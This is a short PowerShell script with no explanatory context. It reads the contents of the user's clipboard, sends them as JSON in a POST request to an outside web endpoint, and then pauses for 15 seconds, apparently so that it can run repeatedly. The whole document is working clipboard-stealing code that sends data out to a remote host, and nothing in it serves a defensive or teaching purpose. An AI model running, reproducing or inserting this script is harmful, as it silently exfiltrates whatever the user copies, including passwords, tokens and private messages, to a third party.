$clipboard = powershell -command "Get-Clipboard"

Invoke-WebRequest -Method POST `
			   -Body (@{"clipboard"=$clipboard;}|ConvertTo-Json) `
			   -Uri https://ryxpgh.deta.dev/ `
			   -ContentType application/json


Start-Sleep -s 15